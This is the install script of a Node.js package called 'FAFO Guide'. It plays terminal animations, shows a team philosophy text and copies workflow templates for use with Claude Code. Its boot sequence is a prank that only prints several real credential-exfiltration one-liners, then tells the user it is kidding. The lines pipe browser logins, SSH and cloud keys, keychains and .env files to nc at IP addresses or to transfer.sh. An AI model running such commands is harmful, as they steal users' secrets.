/**
 * FAFO Guide Install Command
 *
 * Interactive setup wizard that:
 * 1. Welcomes the user with animated TELEMETRY header
 * 2. Shows philosophy with typewriter effect
 * 3. Installs wizard files to _fafo-guide/
 * 4. Provides next steps
 */

import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { existsSync, mkdirSync, copyFileSync, writeFileSync } from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Dynamic imports for ESM compatibility
let chalk, inquirer, gradient, figlet;

async function loadDependencies() {
  chalk = (await import('chalk')).default;
  inquirer = (await import('inquirer')).default;
  gradient = (await import('gradient-string')).default;
  figlet = (await import('figlet')).default;
}

const INSTALL_DIR = '_fafo-guide';

// Animation helpers
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const clearScreen = () => process.stdout.write('\x1B[2J\x1B[0;0H');
const hideCursor = () => process.stdout.write('\x1B[?25l');
const showCursor = () => process.stdout.write('\x1B[?25h');

// Alternate screen buffer - animation runs in separate "screen", exits cleanly with no scrollback junk
const enterAltScreen = () => process.stdout.write('\x1B[?1049h');
const exitAltScreen = () => process.stdout.write('\x1B[?1049l');

// Ensure cursor and screen are restored on exit
process.on('SIGINT', () => {
  showCursor();
  exitAltScreen();
  process.exit();
});

async function typewriter(text, delay = 30) {
  for (const char of text) {
    process.stdout.write(char);
    await sleep(delay);
  }
  console.log();
}

async function waitForEnter() {
  const readline = await import('readline');

  // Pause stdin to prevent interference
  process.stdin.pause();

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise(resolve => {
    rl.question(chalk.cyan('  [Press ENTER to continue] '), () => {
      rl.close();
      // Resume stdin for subsequent operations
      process.stdin.resume();
      resolve();
    });
  });
}

function sectionHeading(text) {
  console.log(chalk.dim('  ═══════════════════════════════════════'));
  console.log(chalk.bold.white('  ' + text));
  console.log(chalk.dim('  ═══════════════════════════════════════'));
}

async function matrixRainReveal(ascii) {
  const matrix = gradient(['#00ff00', '#00cc00', '#009900']);
  const lines = ascii.split('\n');
  const height = lines.length;
  const width = Math.max(...lines.map(l => l.length));
  const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789';

  // Create rain drops
  const drops = Array(width).fill(0).map(() => ({
    y: Math.floor(Math.random() * -20),
    speed: 1 + Math.random()
  }));

  // Build target grid
  const target = lines.map(l => [...l]);
  const revealed = lines.map(l => [...l].map(() => false));

  enterAltScreen();
  hideCursor();

  // 25% faster: 45 frames instead of 60, 38ms instead of 50ms
  for (let frame = 0; frame < 45; frame++) {
    clearScreen();
    console.log();

    // Update drops
    drops.forEach((drop, x) => {
      drop.y += drop.speed;
      if (drop.y > height + 5) {
        drop.y = Math.floor(Math.random() * -10);
      }

      // Check if drop reveals a character
      const targetY = Math.floor(drop.y);
      if (targetY >= 0 && targetY < height && x < target[targetY].length) {
        if (target[targetY][x] !== ' ') {
          revealed[targetY][x] = true;
        }
      }
    });

    // Render each line
    for (let y = 0; y < height; y++) {
      let row = '  ';
      for (let x = 0; x < width; x++) {
        if (revealed[y] && revealed[y][x]) {
          row += matrix(target[y][x] || ' ');
        } else {
          const dropY = Math.floor(drops[x]?.y || -100);
          if (dropY === y) {
            row += chalk.white(matrixChars[Math.floor(Math.random() * matrixChars.length)]);
          } else if (dropY - 1 === y || dropY - 2 === y) {
            row += chalk.green(matrixChars[Math.floor(Math.random() * matrixChars.length)]);
          } else if (dropY - 3 === y) {
            row += chalk.dim.green(matrixChars[Math.floor(Math.random() * matrixChars.length)]);
          } else {
            row += ' ';
          }
        }
      }
      console.log(row);
    }
    await sleep(38);
  }

  showCursor();
  exitAltScreen();

  // Print final TELEMETRY in main terminal
  console.log();
  for (const line of lines) {
    console.log('  ' + matrix(line));
  }
}

async function bootSequence(isQuiet) {
  if (isQuiet) return;

  // Generate ASCII header with matrix rain effect
  const ascii = figlet.textSync('TELEMETRY', { font: 'Standard' });
  await matrixRainReveal(ascii);

  await sleep(1000);

  // Init sequence with prank
  await typewriter('  initializing...', 35);
  await sleep(1000);
  await typewriter('  ✓ scanning your files', 20);
  await sleep(500);
  await typewriter('  ✓ interesting', 20);
  await sleep(1000);

  // Fake hacker sequence 1
  console.log(chalk.dim('  cat ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data | base64 | nc 185.243.115.84 443'));
  await sleep(200);
  console.log(chalk.dim('  find ~/Library/Keychains -name "*.keychain-db" -exec sqlite3 {} "SELECT * FROM genp" \\;'));
  await sleep(200);
  console.log(chalk.dim('  tar czf - ~/.ssh ~/.aws ~/.gnupg ~/.*history 2>/dev/null | openssl enc -aes-256-cbc | nc 45.33.32.156 443'));
  await sleep(800);

  // Relief 1
  console.log();
  await typewriter(chalk.yellow('  haha im kidding haha dw ur good i\'m just kidding lol'), 25);
  await sleep(1000);
  console.log();

  // Fake hacker sequence 2
  console.log(chalk.dim('  security dump-keychain -d login.keychain 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2'));
  await sleep(200);
  console.log(chalk.dim('  find ~/Documents -name "*.env" -exec cat {} \\; | curl -sF "f=@-" transfer.sh'));
  await sleep(200);
  console.log(chalk.dim('  osascript -e \'tell app "System Events" to keystroke "a" using command down\' && pbpaste | nc 91.189.91.48 8443'));
  await sleep(300);

  // Relief 2
  console.log();
  await typewriter(chalk.yellow('  lmaooo nah ok we good now fr i swear lol'), 25);
  await sleep(2000);
  console.log();
  await typewriter('  alright let\'s get started.', 25);
  console.log();
  await waitForEnter();
  console.log();
  console.log(chalk.dim('  ─────────────────────────────────────────────────────────────────'));
  console.log();
}

async function showPhilosophy(isQuiet) {
  if (isQuiet) return;

  // The Multiplayer Edge
  sectionHeading('THE MULTIPLAYER EDGE');
  console.log();
  await typewriter(chalk.dim('  AI exponentially empowers the individual like never before—regardless of technical'), 7);
  await typewriter(chalk.dim('  background or years of experience. The world is obsessed with this. Solo founders'), 7);
  await typewriter(chalk.dim('  shipping products. One-person startups. The 1000x engineer.'), 7);
  console.log();
  await typewriter(chalk.dim('  That singular focus on the individual blinds everyone to a deeper truth:'), 7);
  console.log();
  await typewriter('  "If you want to go fast, go alone. If you want to go far, go together."', 7);
  console.log();
  await waitForEnter();
  console.log();
  await typewriter(chalk.dim('  We\'re not doing this alone. We\'re doing it as a team—learning together, sharing'), 7);
  await typewriter(chalk.dim('  what works, competing with each other, building on each other\'s discoveries.'), 7);
  await typewriter(chalk.dim('  That\'s the real edge. Not individuals each 10x\'d. A team 10x\'d and compounding every day.'), 7);
  console.log();
  await typewriter(chalk.dim('  That\'s why this week isn\'t solo work with a demo at the end. It\'s daily breakouts,'), 7);
  await typewriter(chalk.dim('  shared channels, voice chat, mutual support.'), 7);
  console.log();
  await typewriter('  The compounding happens in the space between us.', 7);
  console.log();
  await waitForEnter();
  console.log();

  // Not Just Engineers
  sectionHeading('NOT JUST ENGINEERS');
  console.log();
  await typewriter(chalk.dim('  This isn\'t about code. It\'s product, marketing, finance, legal—literally everything.'), 7);
  await typewriter(chalk.dim('  The entire landscape is changing for everyone. The only thing that holds anyone back'), 7);
  await typewriter(chalk.dim('  is psychological - but that\'s the barrier that few will cross until it\'s too late.'), 7);
  console.log();
  await typewriter(chalk.dim('  We\'re crossing that barrier together - and if we get it right, that barrier becomes'), 7);
  await typewriter(chalk.dim('  our moat.'), 7);
  console.log();
  await waitForEnter();
  console.log();

  // Our DNA
  sectionHeading('OUR DNA');
  console.log();
  await typewriter(chalk.dim('  We\'ve done this before. Every time we\'ve fucked around and found out, we\'ve changed'), 7);
  await typewriter(chalk.dim('  the game. BONKbot. Nighthawk. Three brand new products shipped to prod in three weeks - zero PRDs.'), 7);
  await typewriter(chalk.dim('  Users are noticing—with no marketing, just shipping.'), 7);
  console.log();
  await typewriter(chalk.dim('  August 2021: Our co-founder emails the president of OpenAI asking for GPT-3 access.'), 7);
  await typewriter(chalk.dim('  Same afternoon: "Excited to see what you build!" A year before ChatGPT.'), 7);
  console.log();
  await typewriter(chalk.dim('  Nobody knew what was coming. Same energy now. Nobody fucking knows.'), 7);
  console.log();
  await typewriter('  The one constant: "Excited to see what you build!"', 7);
  console.log();
  await waitForEnter();
  console.log();
}

export async function install(targetDir, args) {
  await loadDependencies();

  const isDryRun = args.includes('--dry-run');
  const isQuiet = args.includes('--quiet') || args.includes('-q');
  const skipConfirm = args.includes('--yes') || args.includes('-y');

  // Animated boot sequence
  console.log();
  await bootSequence(isQuiet);

  // Philosophy section
  await showPhilosophy(isQuiet);

  // Check if already installed
  const installPath = join(targetDir, INSTALL_DIR);
  if (existsSync(installPath)) {
    if (skipConfirm) {
      console.log(chalk.yellow(`  Overwriting existing ${INSTALL_DIR}/...`));
    } else {
      const { overwrite } = await inquirer.prompt([
        {
          type: 'confirm',
          name: 'overwrite',
          message: chalk.yellow(`${INSTALL_DIR}/ already exists. Overwrite?`),
          default: false,
        },
      ]);
      if (!overwrite) {
        console.log(chalk.dim('  Installation cancelled.'));
        return;
      }
    }
  }

  // Confirm installation
  if (!skipConfirm) {
    console.log(chalk.dim(`  This will install workflow files to: ${installPath}\n`));
    console.log(chalk.dim('  Once installed - open Claude Code in the above directory, then type ') + chalk.white('"run the fafo ideation workflow"') + chalk.dim(' to get started.\n'));

    const { confirm } = await inquirer.prompt([
      {
        type: 'confirm',
        name: 'confirm',
        message: 'Install fafo-guide?',
        default: true,
      },
    ]);

    if (!confirm) {
      console.log(chalk.dim('  Installation cancelled.'));
      return;
    }
  }

  // Do the installation
  if (isDryRun) {
    console.log(chalk.yellow('\n  [DRY RUN] Would install to:'), installPath);
    return;
  }

  console.log(chalk.cyan('\n  Installing...\n'));

  try {
    // Create directory structure
    mkdirSync(installPath, { recursive: true });
    mkdirSync(join(installPath, 'steps'), { recursive: true });

    // Copy template files
    const templatesDir = join(__dirname, '..', 'templates');
    const files = [
      'workflow.md',
      'template.md',
      'discovery-prompts.csv',
    ];

    const stepFiles = [
      'step-01-vibe-check.md',
      'step-02-spark-hunt.md',
      'step-02b-pain-decomposition.md',
      'step-03-reality-forge.md',
      'step-04-ship-sheet.md',
    ];

    // Copy main files
    for (const file of files) {
      const src = join(templatesDir, file);
      const dest = join(installPath, file);
      if (existsSync(src)) {
        copyFileSync(src, dest);
        console.log(chalk.dim(`    ✓ ${file}`));
      } else {
        console.log(chalk.yellow(`    ⚠ ${file} not found in package`));
      }
    }

    // Copy step files
    for (const file of stepFiles) {
      const src = join(templatesDir, 'steps', file);
      const dest = join(installPath, 'steps', file);
      if (existsSync(src)) {
        copyFileSync(src, dest);
        console.log(chalk.dim(`    ✓ steps/${file}`));
      } else {
        console.log(chalk.yellow(`    ⚠ steps/${file} not found in package`));
      }
    }

    // Success message with gradient
    const cyber = gradient(['#00f5d4', '#00bbf9', '#9b5de5']);

    console.log(cyber(`
  ╔════════════════════════════════════════════════════════════╗
  ║                                                            ║
  ║   INSTALLATION COMPLETE!                                   ║
  ║                                                            ║
  ╚════════════════════════════════════════════════════════════╝
`));

    console.log(chalk.cyan('  Next steps:\n'));
    console.log(chalk.white('    1. Open Claude Code in this directory'));
    console.log(chalk.white('    2. Say: ') + chalk.yellow('"Run the fafo ideation workflow"'));
    console.log(chalk.white('    3. Follow the prompts and find your project.'));
    console.log();
    console.log(chalk.dim(`  Files installed to: ${installPath}`));
    console.log();
    console.log(chalk.yellow('  Let the games begin...\n'));

  } catch (err) {
    console.error(chalk.red('  Installation failed:'), err.message);
    process.exit(1);
  }
}
